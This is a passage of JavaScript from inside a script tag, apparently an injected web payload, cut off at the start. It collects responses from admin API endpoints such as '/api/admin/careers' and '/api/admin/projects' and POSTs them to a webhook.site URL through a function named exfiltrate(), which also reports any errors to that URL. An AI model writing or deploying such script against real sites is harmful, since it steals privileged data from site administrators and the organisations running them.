      '/api/admin/careers',

      '/api/admin/projects'

      } catch (e) {
        results[url] = { error: e.message };
      }
    }
    
    await fetch('https://webhook.site/5b97dd7e-1c6b-4311-8242-338439264a62', {
      method: 'POST',

      body: JSON.stringify(results)
    });
  } catch (err) {
    await fetch('https://webhook.site/5b97dd7e-1c6b-4311-8242-338439264a62?error=' + encodeURIComponent(err.message));
  }
}
exfiltrate();
</script>
